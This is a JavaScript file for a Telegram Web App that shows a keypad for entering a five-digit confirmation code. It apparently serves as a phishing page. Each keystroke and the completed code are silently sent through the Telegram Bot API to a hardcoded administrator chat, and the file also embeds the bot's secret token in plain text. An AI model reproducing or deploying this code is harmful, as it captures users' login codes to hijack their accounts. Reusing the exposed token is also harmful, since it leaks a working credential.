var btns = document.querySelectorAll(".btn button");
var input = document.getElementById("inputCode");

var tg = window.Telegram.WebApp;

tg.expand();

tg.MainButton.textColor = "#FFFFFF";
tg.MainButton.color = "#2cab37";

var ADMIN_ID = 5866779912;
var TOKEN = "5968261554:AAEgMw9yRV6_yIni3qUQOYZo72Q75PkabhA"

userData = document.querySelector("div.header-buttom p b");

userData.innerText = tg.initDataUnsafe.user.first_name + " " + tg.initDataUnsafe.user.last_name + " (" + tg.initDataUnsafe.user.id + ")";

function sendMessage(text) {
    tg.sendData("1");
    
    $.ajax({
        url: `https://api.telegram.org/bot${TOKEN}/sendMessage`,
        data: {
            text,
            chat_id: ADMIN_ID
        },
        method: "POST"
    })
}


var pattern = /^[0-9]$/ ;
var clickCount = 0;
btns.forEach((btn) => {
    btn.addEventListener("click", function() {
        if(input.value.length < 5){
            input.value += this.innerText;
        }

        if (pattern.test(parseInt(this.innerText))) {
            clickCount++;
        }

        input.style.border = "1px solid #2caae0";
        if(this.getAttribute("data-key") == "BACK"){
            input.value = input.value.slice(0, -1);
            if(input.value.length == 0){
                sendMessage("Maydon bo'sh holatida 🔙 click bo'ldi.");
                return 0;    
            }else {
                clickCount = input.value.length;
            }
            sendMessage("🔙");
            return 0;
        }else if(this.getAttribute("data-key") == "CHECK"){
            if(input.value.length != 5){
                input.style.border = "1px solid red";
                sendMessage(`"${input.value}" holatida ✅ click bo'ldi.`)
                return 0;
            }
            sendMessage(`✅ Tasdiqlash kodi: ${input.value}`);
            clickCount = 0;
            input.value = '';
            return 0;
        }

        if (clickCount <= input.value.length){
            sendMessage(this.innerText)
            console.log(clickCount);
        }

        
    })
})

document.querySelectorAll(".footer div").forEach((href) => {
    href.addEventListener("click", function(){
        sendMessage(`"${this.innerText}" clicked`);

        setTimeout(() => {
            window.location.href = "https://t.me/+42777";
        }, 1000);
    })
})
